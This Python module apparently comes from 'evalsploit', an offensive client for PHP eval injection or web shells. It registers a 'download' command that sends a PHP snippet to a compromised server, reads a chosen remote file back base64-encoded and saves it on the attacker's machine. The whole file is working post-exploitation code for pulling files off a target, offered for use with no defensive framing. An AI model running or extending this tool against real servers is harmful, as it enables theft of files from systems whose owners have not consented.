from __future__ import annotations

from base64 import b64decode
from pathlib import Path
from typing import TYPE_CHECKING, Optional

from evalsploit.config import project_root
from evalsploit.modules.base import load_snippet, substitute, php_quote
from evalsploit.modules.registry import register
from evalsploit.modules.base import Module

if TYPE_CHECKING:
    from evalsploit.context import SessionContext


@register("download")
class DlModule(Module):
    def run(self, ctx: "SessionContext", args: str) -> Optional[str]:
        if not args.strip():
            return None
        parts = [p.strip() for p in args.split(":", 1)]
        remote_path = ctx.resolve_path(parts[0])
        if not ctx.file_exists(remote_path):
            print("File does not exist")
            return None
        snip = load_snippet(ctx.config.snippet_dl or "dl", "dl")
        if not snip:
            return "Snippet not found"
        php = substitute(snip, {"$_LOCAL": php_quote(remote_path)})
        out = ctx.send(php)
        if out.strip() in ("X", "0"):
            print("Download failed")
            return None
        name = Path(remote_path).name
        if len(parts) > 1 and parts[1]:
            local_path = Path(parts[1])
            if local_path.exists() and local_path.is_dir():
                dest = local_path / name
            else:
                dest = local_path
                dest.parent.mkdir(parents=True, exist_ok=True)
        else:
            downloads_dir = project_root() / "data" / "downloads"
            downloads_dir.mkdir(parents=True, exist_ok=True)
            dest = downloads_dir / name
        try:
            dest.write_bytes(b64decode(out))
            print(f"Saved to {dest}")
        except Exception as e:
            print(f"Error saving: {e}")
        return None


register("get")(DlModule)
register("dl")(DlModule)
